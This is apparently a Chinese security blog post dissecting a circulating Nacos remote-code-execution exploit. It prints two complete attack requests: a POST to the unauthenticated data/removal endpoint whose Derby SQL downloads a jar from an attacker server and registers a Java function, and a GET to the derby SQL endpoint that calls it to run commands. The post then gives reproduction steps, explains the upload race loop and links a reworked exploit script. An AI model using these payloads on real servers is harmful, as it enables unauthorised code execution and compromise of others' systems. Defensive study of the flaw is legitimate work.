#  关于网传的nacos最新0day   
原创 fkalis  fkalis   2024-07-15 20:00  
  
> 个人理解的漏洞原理：本质实际上就是在20年那个未授权的基础上添加了命令执行，但是也导致了该漏洞的利用条件变得比较苛刻，目前测试需要比较多的条件才能进行漏洞利用  
  
  
  
## 1. 0day作者的poc地址  
  
https://github.com/ayoundzw/nacos-poc/blob/main/exploit.py  
  
## 2. poc提取  
> 根据作者的poc，其本质上就是两种poc数据包，下面的poc并不一定可以直接使用，下面漏洞分析的时候会解答  
  
  
  
  
****1. **利用该poc去服务器地址远程下载payload代码**  
  
```
POST /nacos/v1/cs/ops/data/removal HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 487
Content-Type: multipart/form-data; boundary=75fe833dc591c841a56f8fcfba0d650f

--75fe833dc591c841a56f8fcfba0d650f
Content-Disposition: form-data; name="file"; filename="file"

CALL sqlj.install_jar('http://服务端地址/download', 'NACOS.pbKZBiXL', 0)

        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.pbKZBiXL')

        CREATE FUNCTION S_EXAMPLE_pbKZBiXL( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'

--75fe833dc591c841a56f8fcfba0d650f--
```  
  
****  
**2. 调用payload创建的函数去执行（本质上就是利用了20年的sql注入未授权)**  
```
GET /nacos/v1/cs/ops/derby?sql=select+%2A+from+%28select+count%28%2A%29+as+b%2C+S_EXAMPLE_qejBMrcu%28%27whoami%27%29+as+a+from+config_info%29+tmp+%2F%2AROWS+FETCH+NEXT%2A%2F HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like         Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```  
  
****##   
## 3. 漏洞复现  
  
### 3.1. 首先将作者的poc中的config文件和service文件放置到公网服务器上  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nFnyZVwuUEGCgvEKw0Rq7kvuPF3pC10F850pKguzpWNPPqhMSRrbDKQ/640?wx_fmt=png&from=appmsg "")  
  
### 3.2. 修改config文件中的ip为0.0.0.0（保证flask可以被外网访问）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nGDSBbrPiaqBXXVNv2QYclZF55TVp2uKsSrKqQQFGyMlYICt7CM2a9mA/640?wx_fmt=png&from=appmsg "")  
  
### 3.3. 修改本地的config文件中的ip修改为远程服务器的地址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2ns00Q0IaXBvTbaxrxS4vogzSVUAAqcyrFXGg9NpejiacMn0GYoR5R8pg/640?wx_fmt=png&from=appmsg "")  
  
### 3.4. 运行poc即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nhHy7WB9d1n7o5zNzxuZfxFhuyrY0dxrkBEb25N6ZeYibX5auln4AImg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2ntTFtAf2sczicPCnkgURiaQHUd9mhcibw1D2Gg9ecL1JO1icIvWWfXQaVRg/640?wx_fmt=png&from=appmsg "")  
### 3.5. 复现数据包  
##### 3.5.1.1. 数据包1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nGbpcvRhZEgTdB9eiapUdrslrhD0UEs8VkeTUYRsibcYrIlCKBoN6tRPQ/640?wx_fmt=png&from=appmsg "")  
#### 3.5.1. 数据包2  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2n8VxGqiciaQMj7sVskpeTDJ10LIiaXibBND6alVg8K4Xl49XGfYaTmovk9Q/640?wx_fmt=png&from=appmsg "")  
##   
## 4. 漏洞分析  
  
> **总的来说利用难度比较大**  
  
**1. 需要运气好撞出tmp，利用时间长**  
  
**2. removal接口没有鉴权**  
  
**3. 存在20年的sql注入未授权，也就是derby没有鉴权**  
  
  
  
1. **该漏洞需要撞，才可以成功执行数据包1**  
  
  
> 下图是我第一次漏洞利用成功的数据包，重发会报错  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nNgKJe1zkxqpD1MOVyHlibgsUBeGZF0ibiaC9aXMrqJkFK5IpelQTe1bjw/640?wx_fmt=png&from=appmsg "")  
> 得不断的去碰撞，才可以实现成功上传  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nciabytXIVloBiadpfVjvbJHnxqARrnGiaQdQZsfIutvmTFdlrsQXr9aWQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2n9vLOHY0JlVqnnC3uy9xVsmhFQSW3R6J95PkK6bU1X2sBAn9c8meY8Q/640?wx_fmt=png&from=appmsg "")  
1. **removal接口没有鉴权**  
  
  
> 在测试到时候发现很多网站都会403，也就无法利用，除非进入后台  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2n6N8vFmB7RZ7WwWuvliahN7ibUPAIhEyJyV8jw0127plr58W9XqMYgBXA/640?wx_fmt=png&from=appmsg "")  
##   
## 5. 作者poc分析  
  
### 5.1. 碰撞上传  
> **这里的 for i in range(0, sys.maxsize):就是为了进行碰撞上传，sys.maxsize在64位的操作系统中为9223372036854775807，相当于死循环了，来实现对tmp的碰撞**  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nRoA0ibTv84mgSOicDO6HxxcLXSDNnDrvbmpaZo1EjwCiaU5rwUz5hsxow/640?wx_fmt=png&from=appmsg "")  
### 5.2. 两次请求  
> 这里指向的两个请求分别就表示了两次poc数据包  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nzEDe4yX8tSKSWxRPnicE7XIMwuU7sGXU9GPqr3ibpNI3V68TId4qGsGw/640?wx_fmt=png&from=appmsg "")  
##   
## 6. 代码优化  
  
> **作者可能编写poc的时候比较仓促，脚本的一些细节没写好，导致会报错，例如ssl证书的报错，等等**  
  
**下面给各位师傅放一下我修改后，实测过的脚本**  
  
**将脚本同步到github上了，师傅可以直接下载，或者联系我获取**  
  
  
  
****  
**https://github.com/FFR66/Nacos_Rce**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nZU39sKlw3JQcibmzAjS7gScXSiaNXPKzhVOH6D8q1PyTgmxstEIMb8tA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OlNJlSSibBicfWOSEKPK8oFDrgUvWlRU2nibibHkvlrPJbM8SGjydDQfZgx0fmdFDK7MoOTXibmRzqYBbx6LfGfuyyg/640?wx_fmt=png&from=appmsg "")  
  
  
  
